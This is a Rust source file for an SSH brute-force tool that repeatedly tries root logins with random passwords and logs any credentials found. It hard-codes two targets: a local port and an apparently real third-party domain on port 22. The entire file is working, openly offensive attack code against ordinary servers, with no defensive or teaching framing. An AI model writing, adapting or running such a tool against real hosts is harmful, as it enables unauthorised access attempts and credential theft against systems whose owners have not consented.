use ssh2::Session;
use core::time;
use std::{net::TcpStream, thread};
use colored::Colorize;
use std::io::Write;
use chrono::Local;
use env_logger::Builder;
use log::LevelFilter;
use rand::distr::{Alphanumeric, SampleString};

fn attack(host: &str, port: u16) {
    loop {
        if check_ssh_login(host, port, "root", Alphanumeric.sample_string(&mut rand::rng(), 8).as_str()) == true {
            return
        }
    }
}

fn check_ssh_login(host: &str, port: u16, username: &str, password: &str) -> bool {
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("TCP connection failed: {}", e));

    match tcp {
        Ok(tcp) => {
            let mut sess = Session::new().expect("Failed to create SSH session");

            sess.set_tcp_stream(tcp);
            match sess.handshake() {
                Ok(_) => {
                    match sess.userauth_password(username, password) {
                        Ok(_) => {
                            log::info!("Login found! target: {} user: {} password: {}", host.green(), username.green(), password.green());
                            sess.authenticated()
                        },
                        Err(e) => {
                            log::info!("Login failed! target: {} user: {} password: {} {}", host.red(), username.red(), password.red(), e.message().purple().italic());
                            false
                        },
                    }
                },
                Err(e) => {
                    log::error!("SSH handshake failed: {}", e);
                    thread::sleep(time::Duration::from_millis(10000));
                    false
                }
            }

            
        },
        Err(e) => {
            println!("Unable to connect to target! {:?}", e);
            false
        }
    }
}

fn create_attack_handle(host: String, port: u16) -> tokio::task::JoinHandle<()> {
    let port = port.clone();
    return tokio::spawn(async move {
        attack(host.as_str(), port)
    })
}

#[tokio::main]
async fn main() {
    Builder::new()
        .format(|buf, record| {
            writeln!(buf,
                "[{}] {} [{}] - {}",
                "Lydia".yellow(),
                Local::now().format("%Y-%m-%dT%H:%M:%S").to_string().blue(),
                record.level(),
                record.args()
            )
        })
        .filter(None, LevelFilter::Info)
        .init();

    create_attack_handle("127.0.0.1".to_string(), 2222);
    create_attack_handle("sten-heimbrodt.de".to_string(), 22);

    loop {

    }
}
